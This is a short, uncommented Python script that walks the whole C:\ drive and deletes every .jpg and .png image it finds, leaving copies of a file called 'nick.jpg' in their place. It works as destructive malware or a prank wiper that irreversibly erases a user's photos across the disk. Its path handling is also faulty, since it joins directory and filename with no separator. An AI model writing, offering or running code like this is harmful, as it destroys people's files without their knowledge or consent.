import os
import shutil
i = 0;
for dirpath, dnames, fnames in os.walk("C:\\"):
    for f in fnames:
        if f.endswith(".jpg") and not f.startswith('nick'):
            shutil.copy2('nick.jpg', dirpath + 'nick' + str(i) + '.jpg')
            os.remove(os.path.join(dirpath,f))
            i += 1
        elif f.endswith(".png"):
            shutil.copy2('nick.jpg', dirpath + 'nick' + str(i) + '.jpg')
            os.remove(os.path.join(dirpath,f))
            i += 1